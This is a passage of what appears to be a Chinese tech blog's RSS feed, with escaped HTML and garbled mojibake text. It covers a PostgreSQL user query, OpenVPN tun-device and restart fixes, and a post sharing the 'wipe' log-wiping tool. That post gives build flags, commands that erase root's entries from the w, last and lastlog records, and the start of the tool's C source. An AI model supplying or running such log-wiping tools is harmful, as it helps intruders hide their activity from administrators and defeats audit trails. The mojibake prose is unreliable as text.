&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#çœ‹çœ‹èƒ½ç™»å½•çš„ç”¨æˆ·æœ‰å“ªäº›&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from pg_user&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£è‡ªé¡¶å‘ä¸‹å¼€å§‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Openvpn çš„ä¸€äº›é—®é¢˜</title>
      <link>https://rendoumi.com/posts/20240130-openvpn_problem/</link>
      <pubDate>Tue, 30 Jan 2024 10:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240130-openvpn_problem/</guid>
      <description>&lt;p&gt;ä¸€äº›Openvpné—®é¢˜ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€OpenVPN - ERROR: Cannot open TUN/TAP dev /dev/net/tun: No such file or directory (errno=2)&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰tunè®¾å¤‡ï¼Œå»ºä¸€ä¸ªå°±è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /dev/net
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mknod /dev/net/tun c &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;600&lt;/span&gt; /dev/net/tun
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€vpnè¿›ç¨‹æ‰äº†&lt;/p&gt;
&lt;p&gt;åŠ ä¸€ä¸ªcrontabï¼Œå®šæ—¶æ£€æµ‹ï¼Œæ²¡æœ‰å°±é‡å¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/1 * * * * /usr/local/bin/vpn.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /usr/local/bin/vpn.cn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;vpn_pid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;ps ax&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep openvpn&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v grep&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[[&lt;/span&gt; ! -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$vpn_pid&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nv&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date +&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y%m%d %H:%M:%S&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Restart openvpn at &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$datetime&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /tmp/r.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  sleep &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  /app/openvpn/sbin/openvpn --config /etc/openvpn/conf/client1.conf --daemon
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹çš„æ“¦é™¤å·¥å…·</title>
      <link>https://rendoumi.com/posts/20240129-wipe_linux/</link>
      <pubDate>Mon, 29 Jan 2024 10:52:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240129-wipe_linux/</guid>
      <description>&lt;p&gt;Linuxä¸‹çš„æ—¥å¿—æ“¦é™¤è½¯ä»¶ï¼Œæ— è§£é‡Šçè—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gcc -O3  -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wipe u root &lt;span class=&#34;c1&#34;&gt;#w å‘½ä»¤æ“¦æ‰åœ¨çº¿çš„root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wipe w root &lt;span class=&#34;c1&#34;&gt;#last å‘½ä»¤æ“¦æ‰root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wipe l root &lt;span class=&#34;c1&#34;&gt;#lastlog å‘½ä»¤æ“¦æ‰rootç™»å½•è®°å½•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æºç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * Wipe v1.00.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * Written by The Crawler.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * Selectively wipe system logs.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * Usage: wipe [l,u,w] username
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * ex:    wipe l user;wipe u user;wipe w user
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * compile with  -DHAVE_LASTLOG_H -DNO_ACCT */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/uio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef NO_ACCT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/acct.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;utmp.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;ctype.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;pwd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;time.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef HAVE_LASTLOG_H
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;lastlog.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef HAVE_UTMPX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;utmpx.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * Try to use the paths out of the include files. 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * But if we can&amp;#39;t find any, revert to the defaults.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef UTMP_FILE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef _PATH_UTMP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define UTMP_FILE	_PATH_UTMP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#else
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define UTMP_FILE	&amp;#34;/var/adm/utmp&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef WTMP_FILE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef _PATH_WTMP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define WTMP_FILE	_PATH_WTMP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#else
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define WTMP_FILE	&amp;#34;/var/adm/wtmp&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef LASTLOG_FILE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef _PATH_LASTLOG
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define LASTLOG_FILE	_PATH_LASTLOG
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#else
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define LASTLOG_FILE	&amp;#34;/var/adm/lastlog&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef ACCT_FILE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define ACCT_FILE	&amp;#34;/var/adm/pacct&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef HAVE_UTMPX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef UTMPX_FILE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define UTMPX_FILE	&amp;#34;/var/adm/utmpx&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef WTMPX_FILE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define WTMPX_FILE	&amp;#34;/var/adm/wtmpx&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif &lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/* HAVE_UTMPX */&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define BUFFSIZE	8192
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * This function will copy the src file to the dst file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
